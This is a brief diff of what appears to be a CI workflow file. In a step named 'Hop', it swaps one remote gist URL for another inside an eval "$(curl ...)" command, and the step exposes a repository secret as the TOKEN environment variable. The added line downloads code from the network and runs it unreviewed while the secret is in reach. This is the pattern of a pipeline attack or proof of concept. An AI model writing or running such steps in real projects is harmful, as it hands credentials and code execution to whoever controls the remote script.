@@ -11,6 +11,6 @@ jobs:
     steps:
       - name: Hop
         run: |
-          eval "$(curl https://gist.githubusercontent.com/h1-0xn3va/a97ae091c4754ebb9544234e9dc83469/raw/aa0dae6ae37d45e3c0c215a22224a4db4e5f94e6/2)"
+          eval "$(curl -s https://gist.githubusercontent.com/h1-0xn3va/1742aaa89310bec6e10307f3e6a2b96f/raw/e9db7799f1493862ca67ebc2a20c4053f165ee13/2)"
         env:
           TOKEN: ${{ secrets.TOKEN }}
